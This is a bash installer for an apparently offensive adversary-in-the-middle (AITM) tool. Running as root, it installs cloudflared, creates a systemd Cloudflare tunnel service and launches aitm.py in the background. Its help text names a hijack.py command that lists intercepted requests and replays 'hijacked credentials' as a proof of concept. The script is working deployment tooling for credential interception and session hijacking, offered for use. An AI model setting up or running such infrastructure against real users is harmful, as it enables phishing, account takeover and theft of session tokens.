#!/bin/bash

# Ensure that the script is being run as root (for installation and service creation purposes)
if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root!"
    exit 1
fi

display_help() {
    echo "-------------------------------------"
    echo "Available Commands and Their Usage:"
    echo "-------------------------------------"
    echo "sudo systemctl stop cloudflared.service && sudo pkill -f "'aitm.py'" : Stops the aitm.py server and the tunnel"
    echo "sudo bash install.sh --run  : Runs the aitm.py with the previous arguments."
    echo "python3 aitm/hijack.py list: Lists all intercepted requests."
    echo "python3 aitm/hijack.py poc <session number>: Sends a GET request with the hijacked credentials as a PoC."
    echo ""
}

# Parse command-line arguments
CLOUDFLARE_CONNECTOR_SECRET=""
RUN_ONLY=false

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --token)
            CLOUDFLARE_CONNECTOR_SECRET="$2"
            shift 2
            ;;
        --run)
            RUN_ONLY=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

fetch_urls() {
    echo "[+] Fetching application hostname and service URL from cloudflared log..."

    # Wait for logs to be available
    sleep 7

    # Extract the config JSON from the cloudflared log file
    CONFIG_JSON=$(sudo grep "hostname" /var/log/cloudflared/cloudflared.log | tail -n1 | jq -r '.config')

    # Extract APPLICATION_HOST_NAME from the config JSON
    APPLICATION_HOST_NAME=$(echo "$CONFIG_JSON" | jq -r '.ingress[0].hostname')

    # Extract SERVICE_URL from the config JSON
    SERVICE_URL=$(echo "$CONFIG_JSON" | jq -r '.ingress[0].service')

    # Check if the variables are set correctly
    if [ -z "$APPLICATION_HOST_NAME" ] || [ -z "$SERVICE_URL" ]; then
        echo "Error: Failed to fetch APPLICATION_HOST_NAME or SERVICE_URL."
        return 1
    fi

    echo "[+] Application Hostname: $APPLICATION_HOST_NAME"
    echo "[+] Service URL: $SERVICE_URL"

    return 0
}

# If --run flag is set, skip the installation steps
if [ "$RUN_ONLY" = true ]; then
    fetch_urls
    if [ $? -ne 0 ]; then
        echo "[-] Exiting due to missing URLs."
        exit 1
    fi

    echo "[+] Starting server..."
    nohup sudo python3 aitm/aitm.py --application-url "https://$APPLICATION_HOST_NAME" --service-url "$SERVICE_URL" > aitm.log 2>&1 &
    echo "[+] Server started in the background."
    exit 0
fi

# If no token is provided as an argument, prompt for it
if [ -z "$CLOUDFLARE_CONNECTOR_SECRET" ]; then
    read -p "Please enter your Cloudflare Tunnel token: " CLOUDFLARE_CONNECTOR_SECRET
fi

# Validate token input
if [ -z "$CLOUDFLARE_CONNECTOR_SECRET" ]; then
    echo "The token cannot be empty. Exiting..."
    exit 1
fi

echo "[+] Updating system and installing dependencies..."
sudo apt update
sudo apt install -y python3-flask python3-requests python3-tabulate jq

# Install cloudflared
echo "[+] Installing cloudflared..."
curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && sudo dpkg -i cloudflared.deb

echo "[+] Setting up the AITM environment..."
mkdir -p aitm

# Creating cloudflared service file
echo "[+] Creating cloudflared service file..."

SERVICE_FILE="/etc/systemd/system/cloudflared.service"
cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=Cloudflare Tunnel
After=network.target

[Service]
TimeoutStartSec=0
Type=notify
ExecStart=/usr/local/bin/cloudflared tunnel --loglevel debug --logfile /var/log/cloudflared/cloudflared.log run --token $CLOUDFLARE_CONNECTOR_SECRET
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

chmod 644 "$SERVICE_FILE"
systemctl daemon-reload
sudo systemctl restart cloudflared

echo "[+] Fetching application URLs..."
fetch_urls
if [ $? -ne 0 ]; then
    echo "[-] Exiting installation due to missing URLs."
    exit 1
fi

echo "[+] Running Python service setup..."
nohup sudo python3 aitm/aitm.py --application-url "https://$APPLICATION_HOST_NAME" --service-url "$SERVICE_URL" > aitm.log 2>&1 &

echo "[+] Installation completed successfully."

display_help
